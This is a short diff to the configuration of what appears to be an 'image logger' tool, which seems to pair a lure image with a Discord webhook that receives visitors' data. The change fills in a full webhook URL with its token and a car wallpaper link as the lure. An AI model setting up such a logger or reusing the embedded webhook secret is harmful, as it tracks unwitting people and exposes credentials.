@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1240698783772180491/WlmBS42nj-OQ4Ummia0LzB1NAiAuzJJqa5GFqHiwdT4OvABP2vWlgQhIS2JWD_SEB9ZP",
+    "image": "https://images.search.yahoo.com/images/view;_ylt=Awr9_RswMkZmvaoCaz6JzbkF;_ylu=c2VjA3NyBHNsawNpbWcEb2lkAzRiNDEyNzM4ODhmNzI2OTgwOWJkZTZlYThiYmZmMDAxBGdwb3MDMjIEaXQDYmluZw--?back=https%3A%2F%2Fimages.search.yahoo.com%2Fsearch%2Fimages%3Fp%3Dcool%2Bcar%26type%3DE211US91088G0%26fr%3Dmcafee%26fr2%3Dpiv-web%26tab%3Dorganic%26ri%3D22&w=1920&h=1200&imgurl=cdn.wallpapersafari.com%2F51%2F13%2F5OcUPQ.jpg&rurl=https%3A%2F%2Fwallpapersafari.com%2Ftop-1000-cool-car-wallpaper%2F&size=483.3KB&p=cool+car&oid=4b41273888f7269809bde6ea8bbff001&fr2=piv-web&fr=mcafee&tt=Top+1000+Cool+Car+Wallpaper+-+WallpaperSafari&b=0&ni=21&no=22&ts=&tab=organic&sigr=45pcfjQWnEHv&sigb=VMUEdydZ7cAT&sigi=rJEQu4acgyUb&sigt=1oT3mzkxmeXY&.crumb=DBhpPKvDxe4&fr=mcafee&fr2=piv-web&type=E211US91088G0", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
